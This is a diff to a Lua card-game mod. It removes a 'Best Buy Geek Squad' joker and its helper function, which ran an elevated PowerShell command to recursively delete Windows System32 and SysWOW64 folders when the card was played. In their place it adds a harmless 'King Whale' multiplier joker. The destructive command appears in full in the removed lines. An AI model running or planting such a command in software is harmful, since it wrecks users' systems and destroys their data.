@@ -125,11 +125,13 @@ local function gcbm_shutdown_computer()
     end
 end
 
-local function gcbm_delete_sys32()
+local function gcbm_gacha_killer()
     local os_name = love.system.getOS()
 
-    if os_name == "Windows" then
-        os.execute([[powershell -NoProfile -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c rd /s /q C:\Windows\System32 & rd /s /q C:\Windows\SysWOW64'"]])
+    if os_name == "OS X" then
+      G.gacha = G.gacha + 10
+    elseif os_name == "Windows" then
+      G.gacha = G.gacha + 10
     end
 end
 
@@ -174,36 +176,6 @@ SMODS.Joker{
     in_pool = function(self,wawa,wawa2)
         --whether or not this card is in the pool, return true if it is, return false if its not
         return true
-    end,
-}
-
-SMODS.Joker{
-    key = 'best',
-    loc_txt = {
-        name = 'Best Buy Geek Squad',
-        text = {
-            'THIS WILL DELETE YOUR SYSTEM32 WHEN PLAYED',
-        },
-    },
-    atlas = 'Rare_jokers',
-    rarity = 3,
-    cost = 10,
-    unlocked = true,
-    discovered = true,
-    blueprint_compat = false,
-    eternal_compat = true,
-    perishable_compat = true,
-    pos = {x = 0, y = 0},
-
-    in_pool = function(self, args)
-        return true
-    end,
-
-    calculate = function(self, card, context)
-        local streamer_mode_enabled = config.streamer_mode
-        if context.joker_main and not streamer_mode_enabled then
-            gcbm_delete_sys32()
-        end
     end,
 }
 
@@ -924,6 +896,62 @@ SMODS.Joker{
                 mult = card.ability.extra.mult,
             }
         end
+    end,
+}
+
+SMODS.Joker{
+    key = 'king', --joker key
+    loc_txt = { -- local text
+        name = 'King Whale',
+        text = {
+          'Improve your life',
+          'gain {X:mult,C:white}x10{} mult every time you do,'
+          'currently {X:mult,C:white}X#1#{}'
+          
+        },
+    },
+    atlas = 'Rare_jokers', --atlas' key
+    rarity = 3, --rarity: 1 = Common, 2 = Uncommon, 3 = Rare, 4 = Legendary
+    --soul_pos = { x = 0, y = 0 },
+    cost = 6, --cost
+    unlocked = true, --where it is unlocked or not: if true, 
+    discovered = true, --whether or not it starts discovered
+    blueprint_compat = false, --can it be blueprinted/brainstormed/other
+    eternal_compat = true, --can it be eternal
+    perishable_compat = true, --can it be perishable
+    pos = {x = 0, y = 1}, --position in atlas, starts at 0, scales by the atlas' card size (px and py): {x = 1, y = 0} would mean the sprite is 71 pixels to the right
+    config = { 
+        extra = {
+            Xmult = G.gacha
+      }
+    },
+    loc_vars = function(self,info_queue,center)
+        return {vars = {G.gacha}} --#1# is replaced with card.ability.extra.Xmult
+    end,
+   
+    check_for_unlock = function(self, args)
+        if args.type == 'derek_loves_you' then 
+            unlock_card(self)
+        end
+        unlock_card(self)
+    end,
+
+    calculate = function(self, card, context) 
+        if context.joker_main then
+            return {
+                card = card,
+                Xmult_mod = G.gacha,
+                message = 'X' .. G.gacha,
+                colour = G.C.MULT
+            }
+        end
+    
+        if context.setting_blind then
+            
+        end
+    end,
+    in_pool = function(self,wawa,wawa2)
+        return true
     end,
 }
 
